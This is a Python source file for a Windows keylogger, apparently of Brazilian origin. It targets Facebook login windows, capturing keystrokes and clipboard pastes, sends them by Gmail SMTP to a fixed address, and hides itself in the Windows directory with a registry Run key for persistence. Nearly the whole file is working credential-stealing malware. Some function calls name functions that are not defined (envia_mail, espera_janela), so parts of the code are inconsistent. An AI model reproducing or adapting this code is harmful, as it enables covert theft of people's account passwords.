#encoding: utf-8
from ctypes import *
import pythoncom
import pyHook
import win32clipboard
from time import sleep
import os
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
import threading
import shutil
import sys
import ntpath
import _winreg

user32 = windll.user32
kernel32 = windll.kernel32
psapi = windll.psapi
current_window = None

def get_current_process():
    hwnd = user32.GetForegroundWindow()
    pid = c_ulong(0)
    user32.GetWindowThreadProcessId(hwnd, byref(pid))
    process_id = "%d" % pid.value
    executable = create_string_buffer("\x00" * 512)
    h_process = kernel32.OpenProcess(0x400 | 0x10, False, pid)
    psapi.GetModuleBaseNameA(h_process,None,byref(executable),512)
    window_title = create_string_buffer("\x00" * 512)
    length = user32.GetWindowTextA(hwnd, byref(window_title),512)
    kernel32.CloseHandle(hwnd)
    kernel32.CloseHandle(h_process)
    return (process_id, executable.value, window_title.value)

def key_stroke(event):
    janela = ''
    global kl
    global log_key
    if event.WindowName != janela:
        janela = event.WindowName.upper()
        if janela.count('FACEBOOK') > 0:
            if janela.count('ENTRE') > 0:
                if event.Ascii > 32 and event.Ascii < 127:
                    log_key += chr(event.Ascii)
                else:
                    if event.Key == "V":
                        win32clipboard.OpenClipboard()
                        pasted_value = win32clipboard.GetClipboardData()
                        win32clipboard.CloseClipboard()
                        log_key += "[PASTE] - %s" % pasted_value
                    else:
                        log_key += "%s" % event.Key.replace('Lshift','').replace('Capital','').replace('Space',' ').replace('Rshift','').replace('Return','\n').replace('Tab','\t').replace('Oem_4E','é')
        else:
            if janela.count('ENTRE') <= 0:
                mail_handler = threading.Thread(target=envia_mail, args=(log_key, ))
                mail_handler.start()
                kl.UnhookKeyboard()
                log_key = ''
                espera_janela()
        return True
    
def wait_facebook():
    global kl
    while True:
        janela = ''
        janela = get_current_process()[2].upper()
        sleep(1)
        if janela.count('FACEBOOK') > 0:
            if janela.count('ENTRE') > 0:           
                kl = pyHook.HookManager()
                kl.KeyDown = key_stroke
                kl.HookKeyboard()                
                pythoncom.PumpMessages()
                
def send_mail(log_key):
    fromaddr = 'email@gmail.com'
    toaddrs  = 'email@gmail.com'
    msg = MIMEMultipart('alternative')
    msg['Subject'] = "Log da máquina: " + os.environ['COMPUTERNAME']
    msg['From'] = fromaddr
    msg['To'] = toaddrs
    part1 = MIMEText(log_key, 'plain')
    msg.attach(part1)
    username = 'email@gmail.com'
    password = 'passwd'
    server = smtplib.SMTP('smtp.gmail.com:587')
    server.ehlo()
    server.starttls()
    server.login(username,password)
    server.sendmail(fromaddr, toaddrs, msg.as_string())
    server.quit()
    
def install():
    shutil.copy(ntpath.basename(sys.argv[0]), os.environ['WINDIR'] + '\\' + ntpath.basename(sys.argv[0]))
    key = _winreg.OpenKey(_winreg.HKEY_CURRENT_USER,'Software\\Microsoft\\Windows\\CurrentVersion\\Run',0, _winreg.KEY_SET_VALUE)
    _winreg.SetValueEx(key, 'system', 0, _winreg.REG_SZ, os.environ['WINDIR'] + '\\' + ntpath.basename(sys.argv[0]))
    key.Close()

if not os.path.isfile(os.environ['WINDIR'] + '\\' + ntpath.basename(sys.argv[0])):
    install()
    
log_key = ''    
kl = pyHook.HookManager()
wait_facebook()

